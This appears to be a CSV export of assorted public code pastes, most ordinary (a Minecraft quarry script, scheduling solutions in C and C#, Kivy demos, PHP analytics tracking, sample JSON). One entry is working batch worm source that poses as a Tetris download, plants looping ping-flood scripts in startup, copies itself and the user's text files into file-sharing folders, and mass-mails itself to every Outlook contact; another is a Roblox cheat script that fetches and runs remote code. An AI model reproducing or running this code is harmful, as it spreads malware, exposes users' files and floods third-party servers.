id,title,username,language,date,content
v2irhkUK,Test Quarry  - W.I.P,Designer_91,Lua,Wednesday 7th of June 2023 09:40:11 AM CDT,"local function parseArgs()
    local args = {...}
    if #args == 3 then
        return tonumber(args[1]), tonumber(args[2]), tonumber(args[3])
    else
        print(""Usage: quarry <length> <width> <depth>"")
        error()
    end
end

local function refuel()
    while turtle.getFuelLevel() < 10 do
        for i = 1, 16 do
            turtle.select(i)
            if turtle.refuel(1) then
                return
            end
        end
        print(""Turtle needs refueling. Please provide fuel."")
        os.sleep(5)
    end
end

local function dig()
    refuel()
    while turtle.detect() do
        turtle.dig()
        os.sleep(0.1)
    end
end

local function moveForward()
    refuel()
    while not turtle.forward() do
        dig()
        os.sleep(0.1)
    end
end

local function moveTo(layer, x, z)
    while turtle.getFuelLevel() < x + z + 10 do
        refuel()
    end
    turtle.up()
    for _ = 1, layer do
        turtle.up()
    end
    for _ = 1, z do
        turtle.back()
    end
    for _ = 1, x do
        turtle.turnLeft()
        turtle.forward()
        turtle.turnRight()
    end
end

local function cycle(moveFunc, turnFunc)
    for _ = 1, width - 1 do
        moveFunc()
        if layer % 2 == 0 then
            turtle.turnLeft()
        else
            turtle.turnRight()
        end
        dig()
        turnFunc()
        moveTo(layer, 0, 1)
        if layer % 2 == 0 then
            turtle.turnRight()
        else
            turtle.turnLeft()
        end
    end
    moveFunc()
end

local function emptyInventory()
    for i = 1, 16 do
        turtle.select(i)
        turtle.dropUp()
    end
    turtle.select(1)
end

local function isInventoryFull()
    for i = 1, 16 do
        if turtle.getItemCount(i) == 0 then
            return false
        end
    end
    return true
end

local function digLayer()
    for x = 1, length do
        cycle(moveForward, turtle.turnRight)
        moveTo(layer, x, 0)
        cycle(moveForward, turtle.turnLeft)
        moveTo(layer, x, 1)
        if isInventoryFull() then
            local currentPosition = {layer=layer, x=x, z=z}
            moveTo(0, 0, 0)
            emptyInventory()
            moveTo(currentPosition.layer, currentPosition.x, currentPosition.z)
        end
    end
end

local length, width, depth = parseArgs()

for layer = 1, depth do
    digLayer()
    if layer < depth then
        turtle.digDown()
        turtle.down()
    end
end

moveTo(0, 0, 0)
emptyInventory()

print(""Quarry complete."")"
NWvAC9xx,GreedyApproach,CR7CR7,C,Wednesday 7th of June 2023 09:24:46 AM CDT,"#include <stdio.h>

int calculateMinimumLectures(int n, int L, int topics[])
{
    int lectureCount = 1;
    int totalDuration = 0;

    for (int i = 0; i < n; i++)
    {
        if (totalDuration + topics[i] > L)
        {
            lectureCount++;
            totalDuration = 0;
        }

        totalDuration += topics[i];
    }

    return lectureCount;
}

int calculateTotalDI(int lectureCount, int topics[], int C)
{
    int totalDI = 0;

    for (int i = 0; i < lectureCount; i++)
    {
        int freeTime = topics[i] > 10 ? topics[i] - 10 : 0;
        int DI = freeTime > 0 ? (freeTime - 10) * (freeTime - 10) : 0;
        totalDI += DI;
    }

    if (lectureCount > 1)
        totalDI += C;

    return totalDI;
}

int main()
{
    int caseNumber = 1;

    while (1)
    {
        int n, L, C;
        scanf(""%d"", &n);

        if (n == 0)
            break;

        printf(""Case %d:\n"", caseNumber);

        scanf(""%d %d"", &L, &C);

        int topics[n];
        for (int i = 0; i < n; i++)
        {
            scanf(""%d"", &topics[i]);
        }

        int lectureCount = calculateMinimumLectures(n, L, topics);
        int totalDI = calculateTotalDI(lectureCount, topics, C);

        printf(""Minimum number of lectures: %d\n"", lectureCount);
        printf(""Total dissatisfaction index: %d\n\n"", totalDI);

        caseNumber++;
    }

    return 0;
}
"
Ffxs6uTA,Assignment,CR7CR7,C#,Wednesday 7th of June 2023 09:21:02 AM CDT,"using System;

class Program
{
    static void Main(string[] args)
    {
        int caseNumber = 1;

        while (true)
        {
            int n = int.Parse(Console.ReadLine());
            if (n == 0)
                break;

            Console.WriteLine(""Case {0}:"", caseNumber);

            string[] parameters = Console.ReadLine().Split(' ');
            int L = int.Parse(parameters[0]);
            int C = int.Parse(parameters[1]);

            int[] topics = Array.ConvertAll(Console.ReadLine().Split(' '), int.Parse);

            int lectureCount = CalculateMinimumLectures(n, L, topics);
            int totalDI = CalculateTotalDI(lectureCount, topics, C);

            Console.WriteLine(""Minimum number of lectures: {0}"", lectureCount);
            Console.WriteLine(""Total dissatisfaction index: {0}"", totalDI);
            Console.WriteLine();

            caseNumber++;
        }
    }

    static int CalculateMinimumLectures(int n, int L, int[] topics)
    {
        int lectureCount = 1;
        int totalDuration = 0;

        for (int i = 0; i < n; i++)
        {
            if (totalDuration + topics[i] > L)
            {
                lectureCount++;
                totalDuration = 0;
            }

            totalDuration += topics[i];
        }

        return lectureCount;
    }

    static int CalculateTotalDI(int lectureCount, int[] topics, int C)
    {
        int totalDI = 0;

        for (int i = 0; i < lectureCount; i++)
        {
            int freeTime = topics[i] > 10 ? topics[i] - 10 : 0;
            int DI = freeTime > 0 ? (freeTime - 10) * (freeTime - 10) : 0;
            totalDI += DI;
        }

        if (lectureCount > 1)
            totalDI += C;

        return totalDI;
    }
}
"
tFEY7qdp,Untitled,ElliotDG,Python,Wednesday 7th of June 2023 09:03:48 AM CDT,"# Output from the example, with comments ###
build ### build is called
[INFO   ] [Window      ] Provider: sdl2
[INFO   ] [GL          ] Using the ""OpenGL"" graphics system
[INFO   ] [GL          ] GLEW initialization succeeded
[INFO   ] [GL          ] Backend used <glew>
[INFO   ] [GL          ] OpenGL version <b'4.6.0 - Build 31.0.101.4032'>
[INFO   ] [GL          ] OpenGL vendor <b'Intel'>
[INFO   ] [GL          ] OpenGL renderer <b'Intel(R) Iris(R) Xe Graphics'>
[INFO   ] [GL          ] OpenGL parsed version: 4, 6
[INFO   ] [GL          ] Shading version <b'4.60 - Build 31.0.101.4032'>
[INFO   ] [GL          ] Texture max size <16384>
[INFO   ] [GL          ] Texture max units <32>
[INFO   ] [Window      ] auto add sdl2 input provider
[INFO   ] [Window      ] virtual keyboard not allowed, single mode, not docked
[INFO   ] [Text        ] Provider: sdl2
on_size:  <Screen name=''> size: [100, 100]  
on_enter:  <Screen name=''> size: [100, 100]        ### on_enter is called on the first screen before on_start
on_name:  <Screen name='Screen Two'> size: [100, 100]
on_name:  <Screen name='Screen One'> size: [100, 100]
on_name:  <Screen name='Dummy'> size: [100, 100]
on_start
ScreenManager: size: [800, 552.0]  ### notice the widgets were not sized until after on_start
on_size:  <Screen name='Dummy'> size: [800, 552.0]
set screen   ### changes the screen from dummy to 'Screen One', Dummy is not seen.
on_size:  <Screen name='Screen One'> size: [800, 552.0]
[INFO   ] [Base        ] Start application main loop
[INFO   ] [GL          ] NPOT texture support is available
on_enter:  <Screen name='Screen One'> size: [800, 552.0]
on_leave:  <Screen name='Dummy'> size: [800, 552.0]"
Kgf8Z7RM,Untitled,fabi0,PHP,Wednesday 7th of June 2023 09:02:41 AM CDT,"<?php

use Config\Services;
use App\Libraries\Utils\ModuleUtils;
use App\Libraries\Utils\DevUtils;
use App\Modules\Orders\Models\OrderDomain;
use App\Modules\Brands\Utils\BrandUtils;
use App\Libraries\Utils\ProductCategoryUtils;

if (ModuleUtils::isEnable('gTag')) {
    /**
     * @param $order OrderDomain;
     */
    function generateEventPurchase($order)
    {

        $row = $order->getRow();
        if ($row->ShowedGtag) {
            return;
        }

        Services::database()->table('orders')->set('ShowedGtag', 1)->where('OrderID', $row->OrderID)->update();

        $brandNames = BrandUtils::getBrandNames();
        $categoryNames = ProductCategoryUtils::getAllPaths();

        $return = new stdClass();
        @$return->ecommerce->purchase->actionField->id = $order->getPK();
        @$return->ecommerce->purchase->actionField->affiliation = 'okoffice.bg';
        @$return->ecommerce->purchase->actionField->revenue = $order->Total;
        @$return->ecommerce->purchase->actionField->tax = ($order->Total - $order->TotalWithoutVat);
        @$return->ecommerce->purchase->actionField->shipping = $order->Delivery;
        @$return->ecommerce->purchase->products = array();
        $products = $order->getProducts();
        $loop = 1;
        foreach ($products as $product) {
            $ProductPriceData = unserialize($product['ProductPriceData']);
            $productData = new stdClass();
            $productData->name = $product['ProductName'] . ' , ' . $product['ProductID'];
            $productData->id = $product['ProductID'];
            $productData->brand = $brandNames[$ProductPriceData->ProductBrandCode];
            $productData->category = $categoryNames[$ProductPriceData->ProductCategoryCode];
            $productData->price = $product['ProductPrice'] * 1.2;
            $productData->quantity = $product['Quantity'];
            @$return->ecommerce->purchase->products[] = $productData;

            $items[] = ""{
      'id': '{$product['ProductID']}',
      'name': '{$product['ProductName']}',
      'brand': '"" . $brandNames[$ProductPriceData->ProductBrandCode] . ""',
      'category': '"" . $categoryNames[$ProductPriceData->ProductCategoryCode] . ""',
      'list_position': '{$loop}',
      'quantity': {$product['Quantity']},
      'price': '"" . $product['ProductPrice'] * 1.2 . ""'
    }"";

            $loop++;
        }

        echo ""
        <script>
            gtag('event', 'purchase', {
                'transaction_id' :  "" . $order->getPK() . "",
                'affiliation' : 'okoffice.bg',
                'value' : $order->Total,
                'currency' : 'BGN',
                'tax' :"" . ($order->Total - $order->TotalWithoutVat) . "",
                'shipping' : {$order->Delivery},
                'items' : [
                    "" . implode('', $items) . ""
                ]
            });
        </script>"";

    }

    /**
     * @param $order OrderDomain;
     */
    function renderGTag($order)
    {


        $products = $order->getProducts();
        //        echo ""<script async src='https://www.googletagmanager.com/gtag/js?id=AW-994676596'></script>"";

        $dataLayer = array();
        foreach ($products as $product) {
            $dataLayer[] = ""
                {
                   'sku': '"" . $product['ProductID'] . ""',
                   'name': '"" . $product['ProductName'] . ""',
                   'price': "" . $product['ProductPrice'] * 1.2 . "",  
                   'quantity': "" . $product['Quantity'] . "" 
                }"";
        }


        echo ""<script>ga('require', 'ecommerce');</script>"";
        echo ""<script>gtag('event', 'conversion', {
                    'send_to': 'AW-994676596/DcsHCJ--jaUBEPSeptoD',
                    'value': '{$order->Total}',
                    'currency': 'BGN',
                    'transaction_id': '{$order->OrderID}'
                    });</script>"";


        generateEventPurchase($order);

        foreach ($products as $product) {
            echo ""<script>

                    ga('ecommerce:addItem', {
                        'id': '{$product['ProductID']}',
                        'name': '{$product['ProductName']}',
                        'sku': '',
                        'category': '',
                        'price': '{$product['ProductPrice']}',
                        'quantity': '{$product['Quantity']}'
                    });
                </script>"";
        }

        echo ""<script>ga('ecommerce:send');</script>"";

    }

    Services::hooks()->add_action('CartComplete', 'renderGTag', 10, 1);
}
"
ZyPMj3AS,Untitled,ElliotDG,Python,Wednesday 7th of June 2023 08:54:34 AM CDT,"from kivy.app import App
from kivy.uix.screenmanager import Screen
from kivy.lang import Builder
from kivy.clock import Clock

kv = """"""
#:import NoTransition kivy.uix.screenmanager.NoTransition

<ButtonScreenSelect@Button>:
    on_release: app.root.ids.sm.current = self.text

<MyScreen>:
    BoxLayout:
        orientation: 'vertical'
        Label:
            text: root.name
        
BoxLayout:
    orientation: 'vertical'        
    ScreenManager:
        id: sm
        transition: NoTransition()
        on_size: print(f'ScreenManager: size: {self.size}')
        MyScreen:
            name: 'Dummy'
        MyScreen:
            name: 'Screen One'
        MyScreen:
            name: 'Screen Two'
    BoxLayout:
        size_hint_y: None
        height: dp(48)
        ButtonScreenSelect:
            text: 'Dummy'
        ButtonScreenSelect:
            text: 'Screen One'
        ButtonScreenSelect:
            text: 'Screen Two'
""""""


class MyScreen(Screen):
    def on_enter(self, *args):
        self.show_size('on_enter')

    def on_leave(self, *args):
        self.show_size('on_leave')

    def on_size(self, *args):
        self.show_size('on_size')

    def on_name(self, *args):
        self.show_size('on_name')

    def show_size(self, event_name):
        print(f'{event_name}:  {self} size: {self.size}')


class MyApp(App):
    def build(self):
        print('build')
        return Builder.load_string(kv)

    def on_start(self):
        print('on_start')
        Clock.schedule_once(self.set_screen)

    def set_screen(self, *args):
        print('set screen')
        self.root.ids.sm.current = 'Screen One'


if __name__ == '__main__':
    MyApp().run()
"
Zp1cPNau,Worm.BAT.Agent.ah - Source Code,FlyFar,Batch,Wednesday 7th of June 2023 08:39:09 AM CDT,"echo You can download many good and free Tetris games from
echo www.download.com. Just select games and then search with the word Tetris.
echo This is the new dowload link for the september each month our crew vxchaos
echo publishes a new and fresh download link for all the greatest software and games
echo in this p2p publication.
START  iexplore.exe www.download.com
echo press any key to exit this monthly publication.
pause
echo @echo off >> c:\windows\Startm~1\Programs\StartUp\cry.bat
echo :witch >> c:\windows\Startm~1\Programs\StartUp\cry.bat
echo ping -l 789 www.godhatesfags.com >> c:\windows\Startm~1\Programs\StartUp\cry.bat
echo goto witch >> c:\windows\Startm~1\Programs\StartUp\cry.bat
COPY tetris.com c:\Mydown~1
COPY tetris.com c:\progra~1\bearsh~2\shared
COPY tetris.com c:\progra~1\kazaal~1\myshar~1
COPY tetris.com c:\progra~1\morpheus\myshar~1
COPY tetris.com c:\progra~1\edonke~1\incoming
COPY c:\*.txt c:\progra~1\bearsh~2\shared
COPY c:\*.txt c:\Mydown~1
COPY c:\*.txt c:\progra~1\edonke~1\incoming
COPY tetris.com c:\windows
echo @echo off >> c:\Mydown~1\sex.mpg.bat
echo :witch >> c:\Mydown~1\sex.mpg.bat
echo ping -l 789 www.godhatesfags.com >> c:\Mydown~1\sex.mpg.bat
echo goto witch >> c:\Mydown~1\sex.mpg.bat
echo msgbox (""Fred Waldron Phelps and Shirley Phelps Roper sucks"") >> c:\note.vbs
echo msgbox (""If my ass smells bad then yours smells like a rotten fish"") >> c:\note2.vbs
set f=dress
set b=Entr
set j=ists
echo set no=""Scripting.FileSystem.Object"" >> c:\windows\email.vbs
echo set op=CreateObject(no) >> c:\windows\email.vbs.vbs
echo set pq=CreateObject(""Outlook.Application"") >> c:\windows\email.vbs.vbs
echo set qq=WScript.CreateObject(""Outlook.Application"") >> c:\windows\email.vbs
echo set qf=qq.GetNameSpace(""MAPI"") >> c:\windows\email.vbs
echo set q=qf.Ad%F%L%J%(1) >> c:\windows\email.vbs
echo set ae=q.Ad%F%%B%ies >> c:\windows\email.vbs
echo for x=1 To ae.Count >> c:\windows\email.vbs
echo set fw=pq.CreateItem(0) >> c:\windows\email.vbs
echo set wc=fw >> c:\windows\email.vbs
echo wc.to=pq.GetNameSpace(""MAPI"").Ad%F%L%J%(1).Ad%F%%B%ies(x) >> c:\windows\email.vbs
echo wc.Subject=""Hello"" >> c:\windows\email.vbs
echo wc.Body=""Check out this tetris game!"" >> c:\windows\email.vbs
echo wc.Attachments.Add(""C:\windows\tetris.com"") >> c:\windows\email.vbs
echo wc.send >> c:\windows\email.vbs
echo Next >> c:\windows\email.vbs
echo pq.Quit >> c:\windows\email.vbs
COPY c:\windows\email.vbs c:\windows\Startm~1\Programs\StartUp
set f=
set b=
set j=
CSCRIPT  c:\windows\email.vbs
CSCRIPT  c:\note.vbs
CSCRIPT  c:\note2.vbs"
BdmZfdXf,Easy Grow Obby,LuaXe,Lua,Wednesday 7th of June 2023 08:30:49 AM CDT,"if game:GetService(""Workspace""):FindFirstChild(""GamepassStand"") then while game:GetService(""Workspace""):FindFirstChild(""GamepassStand"") do game:GetService(""Workspace"").GamepassStand:Destroy() end end
if game:GetService(""Workspace""):FindFirstChild(""GamepassesModel"") then while game:GetService(""Workspace""):FindFirstChild(""GamepassesModel"") do game:GetService(""Workspace"").GamepassesModel:Destroy() end end

function lb() local args = {[1] = ""energy drink""}game:GetService(""ReplicatedStorage"").giveGear:FireServer(unpack(args)) local args = {[1] = ""BodySwapPotion""}game:GetService(""ReplicatedStorage"").giveGear:FireServer(unpack(args)) local args = {[1] = ""RocketLauncher""}game:GetService(""ReplicatedStorage"").giveGear:FireServer(unpack(args))
local args = {[1] = ""Knife""}game:GetService(""ReplicatedStorage"").giveGear:FireServer(unpack(args)) end
function s() local args = {[1] = S}game:GetService(""ReplicatedStorage"").ScaleEvent:FireServer(unpack(args)) end
function r() spawn(function () while getgenv().r do local args = {[1] = ""RocketLauncher""}game:GetService(""ReplicatedStorage"").giveGear:FireServer(unpack(args)) wait() end end) end
function rr() spawn(function () while getgenv().rr do
game.Players.LocalPlayer.Backpack:GetChildren()[math.random(1, #game.Players.LocalPlayer.Backpack:GetChildren())].Parent = game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character.RocketLauncher:Activate()
game.Players.LocalPlayer.Character.RocketLauncher.Parent = game.Players.LocalPlayer.Backpack wait()
        end
    end)
end

local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wall%20v3')))()

local w = library:CreateWindow(""Easy Grow Obby (OP)"")

local b = w:CreateFolder(""Main"")

b:Button(""TP To The Game"",function() game:GetService(""TeleportService""):Teleport(13412190446) end)

b:Button(""Get Gear"",function() lb() end)
b:Button(""Transform"",function() s() end)
b:Box(""Scale"",""z"",function(val) S = val end)

b:Label(""Made by X_LuaF#0705"",{TextSize = 21; TextColor = Color3.fromRGB(255,255,255); BgColor = Color3.fromRGB(38, 38, 38);})

local w = library:CreateWindow(""Fun Stuff"")

local b = w:CreateFolder(""Gates of Babylon"")

b:Toggle(""Get Equipment"",function(val) getgenv().r = val r() end)
b:Toggle(""Activate"",function(val) getgenv().rr = val rr() end)

local w = library:CreateWindow(""LocalPlayer"")

local b = w:CreateFolder(""LP"")

b:DestroyGui()

b:Button(""Discord"",function() setclipboard(""workink.co/2GQ/LTD"") end)
b:Button(""Full Version"",function() loadstring(game:HttpGet(""https://pastebin.com/raw/GphZf9Xe"", true))() end)
b:Button(""Rejoin"",function() loadstring(game:HttpGet(""https://pastebin.com/raw/mM7JBG5h"", true))() end)
b:Button(""Reset"",function() loadstring(game:HttpGet(""https://pastebin.com/raw/EEY6SATj"", true))() end)

b:Box(""Speed"",""number"",function(val) S = val end)
b:Box(""Jump"",""number"",function(val) J = val end)
b:Box(""Hip Height"",""number"",function(val) H = val end)
b:Box(""Gravity"",""number"",function(val) G = val end)
 
b:Toggle(""Speed"",function(bool) getgenv().Speed = bool Speed(S) end)
b:Toggle(""Jump"",function(bool) getgenv().Jump = bool Jump(J) end)
b:Toggle(""Hip Height"",function(bool) getgenv().Hip = bool Hip(H) end)
b:Toggle(""Gravity"",function(bool) getgenv().Grav = bool Grav(G) end)

b:Slider(""FOV (Default is 70)"",{min = 0;max = 120;precise = true;},function(val) game.workspace.CurrentCamera.FieldOfView = val end)

function TPCFrame(Player_CFrame) if game.Players.LocalPlayer.Character:FindFirstChild(""HumanoidRootPart"") then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player_CFrame end end
function TPVector3(Player_Position) game.Players.LocalPlayer.Character.HumanoidRootPart.Position = Player_Position.Position end
function PHP(Player_HP) game.Players.LocalPlayer.Character.Humanoid.Health = Player_HP end

function Chat(Mes, Freq) spawn(function () while getgenv().Chat do local args = {[1] = Mes,[2] = ""All""} game:GetService(""ReplicatedStorage"").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args)) wait(Freq) end end) end
function Speed(Nume) spawn(function () while getgenv().Speed do game:GetService(""Players"").LocalPlayer.Character.Humanoid.WalkSpeed = Nume if not getgenv().Speed then game:GetService(""Players"").LocalPlayer.Character.Humanoid.WalkSpeed = 16 end wait() end end) end
function Jump(Nume) spawn(function () while getgenv().Jump do game:GetService(""Players"").LocalPlayer.Character.Humanoid.JumpPower = Nume if not getgenv().Jump then game:GetService(""Players"").LocalPlayer.Character.Humanoid.JumpPower = 50 end wait() end end) end
function Hip(Nume) spawn(function () while getgenv().Hip do game:GetService(""Players"").LocalPlayer.Character.Humanoid.HipHeight = Nume if not getgenv().Hip then game:GetService(""Players"").LocalPlayer.Character.Humanoid.HipHeight = 0.1 end wait() end end) end
function Grav(Nume) spawn(function () while getgenv().Grav do game:GetService(""Workspace"").Gravity = Nume if not getgenv().Grav then game:GetService(""Workspace"").Gravity = 196.2 end wait() end end) end"
dY3ssL3S,Example API Key JSON object,djmango,JSON,Wednesday 7th of June 2023 08:25:45 AM CDT,"{
    ""api_key_id"": ""024736DF-C648-4B66-B2C9-D7411360DC5A"",
    ""user_id"": ""128e59e5-c126-4178-ae62-812dc676b6e9"",
    ""metadata"": {},
    ""enabled"": true,
    ""created"": ""2023-02-19T13:11:06.146871+00:00"",
    ""updated"": ""2023-02-19T13:12:33.919178+00:00"",
    ""last_used"": ""2023-02-19T13:12:33.919179+00:00""
}"
PDpWKW2H,Example Transcript JSON object,djmango,JSON,Wednesday 7th of June 2023 08:22:13 AM CDT,"{
    ""transcription_id"": ""7cf094b91662b7"",
    ""user_id"": ""931c215c-b6c6-4b86-96dd-193f18d8c6dc"",
    ""created"": ""2023-05-03T02:40:52.006612+00:00"",
    ""updated"": ""2023-05-03T02:41:46.412716+00:00"",
    ""name"": ""2023-05-03 02:40:52"",
    ""status"": ""complete"",
    ""orphaned"": false,
    ""translate"": false,
    ""recipients"": [
        ""all""
    ],
    ""webhooks"": [],
    ""file_ffprobe"": {
        ""streams"": [
            {
                ""index"": 0,
                ""codec_name"": ""h264"",
                ""codec_long_name"": ""H.264 / AVC / MPEG-4 AVC / MPEG-4 part 10"",
                ""profile"": ""High"",
                ""codec_type"": ""video"",
                ""codec_tag_string"": ""avc1"",
                ""codec_tag"": ""0x31637661"",
                ""width"": 1280,
                ""height"": 534,
                ""coded_width"": 1280,
                ""coded_height"": 534,
                ""closed_captions"": 0,
                ""film_grain"": 0,
                ""has_b_frames"": 0,
                ""pix_fmt"": ""yuv420p"",
                ""level"": 31,
                ""chroma_location"": ""left"",
                ""field_order"": ""progressive"",
                ""refs"": 1,
                ""is_avc"": ""true"",
                ""nal_length_size"": ""4"",
                ""id"": ""0x1"",
                ""r_frame_rate"": ""24/1"",
                ""avg_frame_rate"": ""24/1"",
                ""time_base"": ""1/48"",
                ""start_pts"": 0,
                ""start_time"": ""0:00:00.000000"",
                ""duration_ts"": 35243,
                ""duration"": ""0:12:14.229167"",
                ""bit_rate"": ""1829574"",
                ""bits_per_raw_sample"": ""8"",
                ""nb_frames"": ""17622"",
                ""extradata_size"": 39,
                ""disposition"": {
                    ""default"": 1,
                    ""dub"": 0,
                    ""original"": 0,
                    ""comment"": 0,
                    ""lyrics"": 0,
                    ""karaoke"": 0,
                    ""forced"": 0,
                    ""hearing_impaired"": 0,
                    ""visual_impaired"": 0,
                    ""clean_effects"": 0,
                    ""attached_pic"": 0,
                    ""timed_thumbnails"": 0,
                    ""captions"": 0,
                    ""descriptions"": 0,
                    ""metadata"": 0,
                    ""dependent"": 0,
                    ""still_image"": 0
                },
                ""tags"": {
                    ""language"": ""und"",
                    ""handler_name"": ""VideoHandler"",
                    ""vendor_id"": ""[0][0][0][0]""
                }
            },
            {
                ""index"": 1,
                ""codec_name"": ""aac"",
                ""codec_long_name"": ""AAC (Advanced Audio Coding)"",
                ""profile"": ""LC"",
                ""codec_type"": ""audio"",
                ""codec_tag_string"": ""mp4a"",
                ""codec_tag"": ""0x6134706d"",
                ""sample_fmt"": ""fltp"",
                ""sample_rate"": ""44100"",
                ""channels"": 2,
                ""channel_layout"": ""stereo"",
                ""bits_per_sample"": 0,
                ""initial_padding"": 0,
                ""id"": ""0x2"",
                ""r_frame_rate"": ""0/0"",
                ""avg_frame_rate"": ""0/0"",
                ""time_base"": ""1/44100"",
                ""start_pts"": 0,
                ""start_time"": ""0:00:00.000000"",
                ""duration_ts"": 32380928,
                ""duration"": ""0:12:14.261406"",
                ""bit_rate"": ""191999"",
                ""nb_frames"": ""31622"",
                ""extradata_size"": 16,
                ""disposition"": {
                    ""default"": 1,
                    ""dub"": 0,
                    ""original"": 0,
                    ""comment"": 0,
                    ""lyrics"": 0,
                    ""karaoke"": 0,
                    ""forced"": 0,
                    ""hearing_impaired"": 0,
                    ""visual_impaired"": 0,
                    ""clean_effects"": 0,
                    ""attached_pic"": 0,
                    ""timed_thumbnails"": 0,
                    ""captions"": 0,
                    ""descriptions"": 0,
                    ""metadata"": 0,
                    ""dependent"": 0,
                    ""still_image"": 0
                },
                ""tags"": {
                    ""creation_time"": ""2013-06-01T09:44:03.000000Z"",
                    ""language"": ""und"",
                    ""handler_name"": ""IsoMedia File Produced by Google, 5-11-2011"",
                    ""vendor_id"": ""[0][0][0][0]""
                }
            }
        ],
        ""format"": {
            ""filename"": ""https://storage.googleapis.com/gtv-videos-bucket/sample/TearsOfSteel.mp4"",
            ""nb_streams"": 2,
            ""nb_programs"": 0,
            ""format_name"": ""mov,mp4,m4a,3gp,3g2,mj2"",
            ""format_long_name"": ""QuickTime / MOV"",
            ""start_time"": ""0:00:00.000000"",
            ""duration"": ""0:12:14.261406"",
            ""size"": ""185765954"",
            ""bit_rate"": ""2023976"",
            ""probe_score"": 100,
            ""tags"": {
                ""major_brand"": ""mp42"",
                ""minor_version"": ""0"",
                ""compatible_brands"": ""isommp42"",
                ""creation_time"": ""2013-06-01T09:43:52.000000Z""
            }
        }
    },
    ""file_mimetype"": ""video/mp4"",
    ""file_extension"": ""mp4"",
    ""url"": ""https://storage.googleapis.com/gtv-videos-bucket/sample/TearsOfSteel.mp4"",
    ""duration_seconds"": 734.0,
    ""validated"": true,
    ""uploaded"": false,
    ""transcribed"": true,
    ""transcription_model"": ""openai/whisper-large"",
    ""transcription_backend"": ""openai"",
    ""language"": ""en"",
    ""text_segments"": [
        {
            ""start"": 0.0,
            ""end"": 7.0,
            ""text"": "" We have main engine start.""
        },
        {
            ""start"": 7.0,
            ""end"": 14.0,
            ""text"": "" Four, three, two, one.""
        },
    ],
    ""text"": ""We have main engine start. Four, three, two, one."",
    ""heading_segments"": [],
    ""summary"": ""The transcription describes a scene in which two characters, Tom and Celia, discuss their passions and fears. They plan to perform in some kind of show or event, but they are running out of time. They start performing, but things go wrong, causing memories to be overridden. Eventually, they learn a lesson from the experience.""
}"
fL1eFfiN,Untitled,fasked,C++ (with Qt extensions),Wednesday 7th of June 2023 08:20:00 AM CDT,"Event composeEvent(const ushort keyCodepoint, const bool shift)
{
    int key = keyCodepoint;

    // Special keys
    // https://w3c.github.io/webdriver/#dfn-normalized-key-value
    if (isSpecialKey(keyCodepoint))
    {
        key = normalizedKey(keyCodepoint);
        if (!isSpecialKeyPrintable(keyCodepoint))
        {
            return Event(key, QString());
        }
        else if (shift && key >= Qt::Key_0 && key <= Qt::Key_9)
        {
            static int keypad[] =
            {
                Qt::Key_Insert,
                Qt::Key_End,
                Qt::Key_Down,
                Qt::Key_PageDown,
                Qt::Key_Left,
                Qt::Key_5,
                Qt::Key_Right,
                Qt::Key_Home,
                Qt::Key_Up,
                Qt::Key_PageUp
            };

            return Event(keypad[key - Qt::Key_0], QString());
        }
        else if (key >= Qt::Key_Asterisk && key <= Qt::Key_Slash)
        {
            return Event(key, QString(QChar(key)));
        }
    }

    const QChar originalChar(key);
    QString text(originalChar);

    if (originalChar.isLetter())
    {
        // Check if a codepoint is latin-1 letter
        const auto latin1 = originalChar.toLatin1();
        if (QChar(latin1).isLetter())
        {
            // Use Qt::Key_A for lower 'a'
            key = originalChar.toUpper().toLatin1();
        }

        // Make any letter upper including non latins
        // That's not how webdriver should work according w3c specs but how we want
        if (shift)
        {
            text = originalChar.toUpper();
        }
    }
    else
    {
        // Shift characters table (excluding letters)
        // https://w3c.github.io/webdriver/#dfn-shifted-character
        if (shift)
        {
            const auto alternate = getAlternateChar(key);
            if (!alternate.isNull())
            {
                text = QString(alternate);
            }
        }
    }

    return { key, text };
}"
